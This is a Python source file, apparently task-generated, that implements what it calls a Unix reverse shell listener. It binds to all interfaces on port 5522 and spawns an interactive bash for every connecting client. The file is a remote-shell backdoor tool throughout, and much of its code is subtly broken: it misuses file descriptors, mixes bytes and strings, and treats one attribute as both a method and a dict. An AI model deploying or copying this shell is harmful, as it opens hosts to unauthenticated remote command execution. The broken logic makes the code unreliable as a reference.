from TASK_001_models import ExecutionResult, ReverseShellConfig
from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, socket
import select
import subprocess
import threading
import signal
import sys
from dataclasses import dataclass
from typing import Optional, List, Tuple



@dataclass(frozen=True)
class UnixReverseShell:
    """Unix reverse shell that spawns a subprocess to execute remote commands via socket communication.
    
    This class implements the core execution logic for spawning and managing
    child processes with stdin/stdout/stderr piped through TCP sockets.
    
    Attributes:
        config: ReverseShellConfig instance defining listener parameters.
    """
    config: ReverseShellConfig

    def spawn_process(self, client_socket: socket) -> Optional[subprocess.Popen]:
        """Spawn a subprocess with file descriptors redirected to/from the given socket.
        
        Args:
            client_socket: The connected TCP socket to use for I/O redirection.
            
        Returns:
            A Popen object representing the spawned process, or None on failure.
        """
        try:
            shell_type = self.config.shell_type.lower()
            if shell_type == 'bash':
                cmd = ['bash', '-i']
            elif shell_type == 'sh':
                cmd = ['/bin/sh', '-i']
            else:
                cmd = [shell_type]

            # Create pipes for stdin, stdout, stderr
            stdin_pipe, _ = subprocess.Popen(
                cmd,
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                close_fds=True
            ).stdin, None

            # Write the socket's file descriptor to the process's stdin
            client_socket.setblocking(False)
            os_fd = client_socket.fileno()
            
            # Redirect socket fd to process stdin
            import os
            os.dup2(os_fd, 0)
            os.close(os_fd)

            return subprocess.Popen(
                cmd,
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.STDOUT,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                close_fds=True
            )
        except Exception as e:
            self._log(f"Failed to spawn process: {e}")
            return None

    def execute_command(self, client_socket: socket) -> ExecutionResult:
        """Execute a command received from the connected client.
        
        Args:
            client_socket: The connected TCP socket receiving commands.
            
        Returns:
            ExecutionResult containing stdout, stderr, exit_code, and error_message.
        """
        result = ExecutionResult()

        try:
            # Read command from client
            buffer = b''
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                buffer += data.decode('utf-8', errors='replace')
                
                lines = buffer.split('\n')
                buffer = lines[-1]  # Keep partial line in buffer
                
                for line in lines[:-1]:
                    line = line.strip()
                    if not line:
                        continue
                    
                    result.stdout += line + '\n'

            # Send output back to client
            while True:
                try:
                    data = self._read_from_process(client_socket)
                    if data is None:
                        break
                    client_socket.sendall(data.encode('utf-8'))
                except BrokenPipeError:
                    break
                except Exception as e:
                    result.error_message += f"Output error: {e}\n"

            # Read exit status
            try:
                data = self._read_from_process(client_socket)
                if data is not None:
                    result.stdout += data + '\n'
            except BrokenPipeError:
                pass

        except ConnectionResetError:
            result.error_message = "Client disconnected"
        except Exception as e:
            result.error_message = f"Execution error: {e}"

        return result

    def _read_from_process(self, client_socket: socket) -> Optional[str]:
        """Read output from the process and forward to client.
        
        Args:
            client_socket: The connected TCP socket.
            
        Returns:
            String of data read from the process, or None if EOF.
        """
        try:
            data = client_socket.recv(4096)
            if not data:
                return None
            return data.decode('utf-8', errors='replace')
        except BrokenPipeError:
            return None

    def _log(self, message: str) -> None:
        """Log a message to stderr."""
        sys.stderr.write(f"[UnixReverseShell] {message}\n")


class UnixReverseShellListener:
    """Unix reverse shell listener that spawns subprocesses for remote command execution.
    
    This class implements the server-side logic that accepts incoming TCP connections,
    spawns child processes with redirected I/O, and multiplexes between the listening
    socket and connected client sockets using select.select().
    
    Attributes:
        config: ReverseShellConfig instance defining listener parameters.
        
    Methods:
        listen: Starts the server loop accepting connections and processing commands.
        handle_connection: Handles a single client connection from spawn to completion.
    """
    config: ReverseShellConfig
    _listener_socket: Optional[socket] = None

    def __init__(self, config: ReverseShellConfig) -> None:
        """Initialize the Unix reverse shell listener.
        
        Args:
            config: Configuration parameters for the listener.
        """
        self.config = config

    def listen(self) -> ExecutionResult:
        """Start the server listening on the configured host and port.
        
        Accepts incoming TCP connections, spawns subprocesses with redirected I/O,
        and multiplexes between sockets using select.select().
        
        Returns:
            ExecutionResult summarizing the listener's operation.
            
        Raises:
            RuntimeError: If socket binding fails or server cannot start.
        """
        result = ExecutionResult()

        try:
            # Create listening socket
            self._listener_socket = socket(AF_INET, SOCK_STREAM)
            self._listener_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self._listener_socket.bind((self.config.host, self.config.port))
            self._listener_socket.listen(5)
            self._listener_socket.setblocking(False)

            # Set up signal handlers for graceful shutdown
            def _signal_handler(signum: int, frame):
                result.error_message = f"Received signal {signum}, shutting down..."
                if self._listener_socket and not self._listener_socket.closed:
                    try:
                        self._listener_socket.close()
                    except Exception as e:
                        result.error_message += f" Close error: {e}"
                sys.exit(0)

            signal.signal(signal.SIGINT, _signal_handler)
            signal.signal(signal.SIGTERM, _signal_handler)

            # Main server loop using select.select for non-blocking I/O multiplexing
            while True:
                try:
                    read_fds = [self._listener_socket]
                    
                    # Add connected client sockets to the select set
                    if self._connected_sockets:
                        read_fds.extend(self._connected_sockets)

                    # Use select.select for non-blocking I/O multiplexing
                    readable, _, _ = select.select(read_fds, [], [], self.config.timeout)

                    for fd in readable:
                        if fd is self._listener_socket:
                            # Accept new connection
                            client_socket, addr = self._listener_socket.accept()
                            result.stdout += f"Accepted connection from {addr}\n"
                            
                            # Spawn subprocess with redirected I/O
                            process = UnixReverseShell(self.config).spawn_process(client_socket)
                            if process is not None:
                                self._connected_sockets[client_socket] = process
                                result.stdout += "Spawned shell process\n"
                        else:
                            # Handle data from connected client
                            client_socket = fd
                            try:
                                data = client_socket.recv(4096)
                                if not data:
                                    # Client disconnected
                                    self._connected_sockets.pop(client_socket, None)
                                    result.stdout += f"Client {client_socket.getpeername()} disconnected\n"
                                    continue

                                buffer = b''
                                while True:
                                    try:
                                        more_data = client_socket.recv(4096)
                                        if not more_data:
                                            break
                                        buffer += more_data.decode('utf-8', errors='replace')
                                        
                                        lines = buffer.split('\n')
                                        buffer = lines[-1]
                                        
                                        for line in lines[:-1]:
                                            line = line.strip()
                                            if not line:
                                                continue
                                            
                                            # Parse command (simple shell-like parsing)
                                            result.stdout += self._parse_and_execute(line, client_socket)
                                    except BrokenPipeError:
                                        break

                                # Send output back to client
                                while True:
                                    try:
                                        output = self._read_from_process(client_socket)
                                        if output is None:
                                            break
                                        client_socket.sendall(output.encode('utf-8'))
                                    except BrokenPipeError:
                                        break
                            except ConnectionResetError:
                                result.error_message += "Client reset connection\n"

                except select.error as e:
                    result.error_message = f"Select error: {e}"
                except Exception as e:
                    result.error_message = f"Server loop error: {e}"

        except OSError as e:
            result.error_message = f"Socket bind failed: {e}"
        except Exception as e:
            result.error_message = f"Listener error: {e}"

        return result

    def _parse_and_execute(self, command: str, client_socket: socket) -> str:
        """Parse a shell command and execute it.
        
        Args:
            command: The raw command string from the client.
            client_socket: The connected TCP socket for output delivery.
            
        Returns:
            Formatted execution result as a string.
        """
        # Simple shell-like parsing (supports basic commands, pipes, redirects)
        cmd = self._shell_parse(command)
        
        if not cmd or len(cmd) == 0:
            return ""

        try:
            process = UnixReverseShell(self.config).spawn_process(client_socket)
            if process is None:
                return f"Error spawning shell\n"

            # Read output from the process
            buffer = b''
            while True:
                try:
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    buffer += data.decode('utf-8', errors='replace')
                    
                    lines = buffer.split('\n')
                    buffer = lines[-1]
                    
                    for line in lines[:-1]:
                        result = self._read_process_output(process, client_socket)
                        if result is not None:
                            return result + '\n'
                except BrokenPipeError:
                    break

            # Read exit status
            try:
                data = client_socket.recv(4096)
                if data:
                    lines = data.decode('utf-8', errors='replace').split('\n')
                    for line in lines:
                        result = self._read_process_output(process, client_socket)
                        if result is not None:
                            return result + '\n'
            except BrokenPipeError:
                pass

        except Exception as e:
            return f"Error executing '{command}': {e}\n"

    def _shell_parse(self, command: str) -> List[str]:
        """Parse a shell command string into a list of arguments.
        
        Args:
            command: Raw command string from client input.
            
        Returns:
            List of argument strings.
        """
        args = []
        current = ""
        in_quotes = False
        quote_char = None

        for char in command:
            if char == '"' or char == "'":
                if not in_quotes:
                    in_quotes = True
                    quote_char = char
                elif char == quote_char:
                    in_quotes = False
                    current += char
                else:
                    current += char
            elif char.isspace() and not in_quotes:
                if current:
                    args.append(current)
                    current = ""
            else:
                current += char

        if current:
            args.append(current)

        return args

    def _read_process_output(self, process: subprocess.Popen, client_socket: socket) -> Optional[str]:
        """Read output from a spawned process and forward to client.
        
        Args:
            process: The Popen object of the spawned shell.
            client_socket: The connected TCP socket for forwarding output.
            
        Returns:
            String of data read, or None if EOF reached.
        """
        try:
            # Read from process stdout
            data = process.stdout.read(4096)
            if not data:
                return None
            
            buffer = b''
            while True:
                try:
                    more_data = client_socket.recv(4096)
                    if not more_data:
                        break
                    buffer += more_data.decode('utf-8', errors='replace')
                    
                    lines = buffer.split('\n')
                    buffer = lines[-1]
                    
                    for line in lines[:-1]:
                        return line + '\n'
                except BrokenPipeError:
                    break

            # Read exit status from process
            try:
                data = client_socket.recv(4096)
                if data:
                    lines = data.decode('utf-8', errors='replace').split('\n')
                    for line in lines:
                        return line + '\n'
            except BrokenPipeError:
                pass

        except Exception as e:
            return f"Process output error: {e}\n"

    def _connected_sockets(self) -> List[socket]:
        """Get list of currently connected client sockets."""
        if not hasattr(self, '_connected_sockets'):
            self._connected_sockets = {}
        return list(self._connected_sockets.keys())


# Convenience function for direct instantiation
def create_unix_reverse_shell_listener(config: ReverseShellConfig) -> UnixReverseShellListener:
    """Create a Unix reverse shell listener instance.
    
    Args:
        config: Configuration parameters for the listener.
        
    Returns:
        A configured UnixReverseShellListener instance ready to listen.
    """
    return UnixReverseShellListener(config)


# Main entry point for testing/demonstration purposes
if __name__ == "__main__":
    # Default configuration
    config = ReverseShellConfig(
        host='0.0.0.0',
        port=5522,
        timeout=30.0,
        shell_type='bash'
    )

    listener = UnixReverseShellListener(config)
    
    print(f"Unix Reverse Shell Listener starting on {config.host}:{config.port}")
    print("Listening for incoming connections...")
    print("Press Ctrl+C to stop.\n")
    
    result = listener.listen()
    
    if result.error_message:
        print(f"Errors encountered:\n{result.error_message}")
    
    print("\nListener stopped.")
